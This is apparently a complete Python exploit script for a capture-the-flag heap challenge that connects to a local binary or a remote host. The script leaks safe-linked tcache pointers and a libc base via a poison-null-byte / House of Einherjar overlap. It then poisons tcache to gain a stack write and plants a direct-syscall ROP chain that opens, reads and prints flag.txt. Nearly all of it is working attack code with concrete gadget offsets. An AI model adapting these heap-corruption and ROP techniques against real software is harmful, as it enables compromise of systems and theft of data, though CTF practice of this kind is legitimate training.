#!/usr/bin/env python3
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(ROOT, "work")
BIN = os.path.join(WORK, "unlimited_codex_for_free")


def p64(x):
    return struct.pack("<Q", x & 0xffffffffffffffff)


def u64(x):
    return struct.unpack("<Q", x.ljust(8, b"\0")[:8])[0]


class Tube:
    def __init__(self, host=None, port=None):
        if host is None:
            self.p = subprocess.Popen(
                [BIN], cwd=WORK, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, bufsize=0)
            self.fd = self.p.stdout.fileno()
            self.sock = None
        else:
            self.sock = socket.create_connection((host, port))
            self.p = None
            self.fd = self.sock.fileno()
        self.buf = b""

    def send(self, b):
        if self.sock:
            self.sock.sendall(b)
        else:
            self.p.stdin.write(b)
            self.p.stdin.flush()

    def recv_some(self, timeout=5):
        r, _, _ = select.select([self.fd], [], [], timeout)
        if not r:
            raise TimeoutError("receive timeout")
        x = os.read(self.fd, 65536)
        if not x:
            raise EOFError(f"connection closed; pending={self.buf!r}; rc={self.p.poll() if self.p else None}")
        self.buf += x

    def recvuntil(self, marker, timeout=5):
        end = time.time() + timeout
        while marker not in self.buf:
            self.recv_some(max(0.01, end-time.time()))
        i = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out

    def recvn(self, n, timeout=5):
        end = time.time() + timeout
        while len(self.buf) < n:
            self.recv_some(max(0.01, end-time.time()))
        out, self.buf = self.buf[:n], self.buf[n:]
        return out


PROMPT = b"$ "


class Codex:
    def __init__(self, t):
        self.t = t
        t.recvuntil(PROMPT)

    def scribe(self, idx, size, data):
        assert len(data) == size
        self.t.send(f"scribe {idx} {size}\n".encode() + data)
        return self.t.recvuntil(PROMPT)

    def amend(self, idx, size, data):
        assert len(data) == size
        self.t.send(f"amend {idx} {size}\n".encode() + data)
        return self.t.recvuntil(PROMPT)

    def bind(self, dst, src):
        self.t.send(f"bind {dst} {src}\n".encode())
        return self.t.recvuntil(PROMPT)

    def burn(self, idx):
        self.t.send(f"burn {idx}\n".encode())
        return self.t.recvuntil(PROMPT)

    def read(self, idx, size):
        self.t.send(f"read {idx} {size}\n".encode())
        self.t.recvuntil(b"\n")
        data = self.t.recvn(size)
        self.t.recvuntil(PROMPT)
        return data

    def quit(self):
        self.t.send(b"quit\n")


def exploit(t, stop_after_leak=False):
    c = Codex(t)

    # Leak an exact heap pointer from safe-linked tcache entries.
    c.scribe(0, 0x18, b"A" * 0x18)
    c.bind(1, 0)
    c.scribe(2, 0x18, b"B" * 0x18)
    c.bind(3, 2)
    c.burn(0)
    c.burn(2)
    key = u64(c.read(1, 8))
    encoded_p0 = u64(c.read(3, 8))
    p0 = encoded_p0 ^ key
    assert key == (p0 >> 12)
    print(f"[+] safe-link key = {key:#x}")
    print(f"[+] first chunk P0 = {p0:#x}")

    # Empty the 0x20 tcache bin and keep these two chunks allocated.
    c.scribe(0, 0x18, b"a" * 0x18)  # P1
    c.scribe(2, 0x18, b"b" * 0x18)  # P0

    # Poison-null-byte / House of Einherjar.  A's last eight usable bytes
    # are B.prev_size, and amend's terminator clears B's PREV_INUSE bit.
    # The first free lazily creates glibc 2.43's 0x300-byte per-thread
    # tcache object between P1 and the next user allocation.
    A = p0 + 0x340
    c.scribe(4, 0x108, b"A" * 0x108)
    c.scribe(5, 0x4f8, b"B" * 0x4f8)
    c.scribe(6, 0x18, b"G" * 0x18)  # consolidation guard

    fake = bytearray(b"\0" * 0x108)
    fake[0x08:0x10] = p64(0x101)
    fake[0x10:0x18] = p64(A)
    fake[0x18:0x20] = p64(A)
    fake[0x100:0x108] = p64(0x100)
    c.amend(4, 0x108, bytes(fake))
    c.burn(5)

    leak = c.read(4, 0x30)
    arena = u64(leak[0x10:0x18])
    print(f"[+] unsorted fd = {arena:#x}")
    libc = arena - 0x1e7ac8
    print(f"[+] libc base = {libc:#x}")
    if t.p:
        maps = open(f"/proc/{t.p.pid}/maps").read()
        libc_line = next(x for x in maps.splitlines() if "libc.so.6" in x and x.split()[2] == "00000000")
        real_libc = int(libc_line.split("-")[0], 16)
        print(f"[+] local libc base = {real_libc:#x}; leak offset = {arena-real_libc:#x}")
        assert libc == real_libc
    if stop_after_leak:
        return

    # Carve two poisonable tcache heads out of the overlapping free chunk.
    # Slot 4 (A) still covers the headers and forward pointers below.
    D = A + 0x10
    E = A + 0x30
    L = A + 0x50
    E2 = A + 0x150
    L2 = A + 0x170
    c.scribe(5, 0x18, b"d" * 0x18)    # D: keeps fake chunk allocated
    c.scribe(7, 0x18, b"e" * 0x18)    # E: writable 0x20-bin head
    c.scribe(8, 0xf8, b"l" * 0xf8)    # L: writable 0x100-bin head
    c.scribe(9, 0x18, b"f" * 0x18)    # E2: second 0x20 entry
    c.scribe(10, 0xf8, b"m" * 0xf8)   # L2: second 0x100 entry

    c.burn(9)
    c.burn(7)
    c.burn(10)
    c.burn(8)

    environ = libc + 0x1eede8
    env_target = environ - 0x18  # aligned; a 24-byte write stops at environ

    overlap = bytearray(b"\0" * 0x108)
    overlap[0x08:0x10] = p64(0x21)   # D.size
    overlap[0x28:0x30] = p64(0x21)   # E.size
    overlap[0x48:0x50] = p64(0x101)  # L.size
    overlap[0x30:0x38] = p64(env_target ^ (E >> 12))
    overlap[0x50:0x58] = p64(L2 ^ (L >> 12))
    c.amend(4, 0x108, bytes(overlap))

    # Consume E and then receive a fake allocation immediately before environ.
    c.scribe(7, 0x18, b"x" * 0x18)
    c.scribe(9, 0x18, b"\0" * 0x18)
    env_dump = c.read(9, 0x38)
    stack_envp = u64(env_dump[0x18:0x20])
    print(f"[+] environ = {stack_envp:#x}")

    # At the command loop, main's saved RBP is exactly environ-0x138.
    # Poison the preserved 0x100-bin list to return that stack address.
    stack_target = stack_envp - 0x138
    overlap[0x30:0x38] = b"E" * 8
    overlap[0x50:0x58] = p64(stack_target ^ (L >> 12))
    c.amend(4, 0x108, bytes(overlap))

    # First allocation consumes L.  Keep the path and output buffer in it.
    heap_io = bytearray(b"\0" * 0xf8)
    heap_io[0:9] = b"flag.txt\0"
    c.scribe(8, 0xf8, bytes(heap_io))

    # Seccomp permits openat/read/write.  A direct-syscall chain avoids any
    # dependence on libc wrapper alignment or an assumed returned fd.
    pop_rdi = libc + 0x2aaf7
    pop_rsi = libc + 0x29e69
    pop_rax = libc + 0x43ee6
    pop_rdx_rbx = libc + 0x91665
    xchg_edi_eax = libc + 0x17d336
    syscall_ret = libc + 0x921b2
    path = L
    outbuf = L + 0x40

    chain = [
        0,                          # replacement saved RBP
        pop_rax, 257,               # openat
        pop_rdi, -100,
        pop_rsi, path,
        pop_rdx_rbx, 0, 0,
        syscall_ret,
        xchg_edi_eax,               # returned fd -> edi
        pop_rax, 0,                 # read
        pop_rsi, outbuf,
        pop_rdx_rbx, 0x100, 0,
        syscall_ret,
        pop_rax, 1,                 # write
        pop_rdi, 1,
        pop_rsi, outbuf,
        pop_rdx_rbx, 0x100, 0,
        syscall_ret,
    ]
    rop = b"".join(p64(x) for x in chain).ljust(0xf8, b"R")
    assert len(rop) == 0xf8
    c.scribe(10, 0xf8, rop)
    print(f"[+] ROP written at main frame {stack_target:#x}")

    c.quit()
    out = t.buf
    t.buf = b""
    try:
        while True:
            t.recv_some(1)
            out += t.buf
            t.buf = b""
    except (EOFError, TimeoutError):
        pass
    return out


if __name__ == "__main__":
    if len(sys.argv) == 3:
        tube = Tube(sys.argv[1], int(sys.argv[2]))
    else:
        tube = Tube()
    result = exploit(tube)
    if result:
        match = re.search(rb"kBxAc\{[^}]*\}", result)
        if match:
            print("[+] flag = " + match.group().decode(errors="replace"))
        else:
            sys.stdout.buffer.write(result)
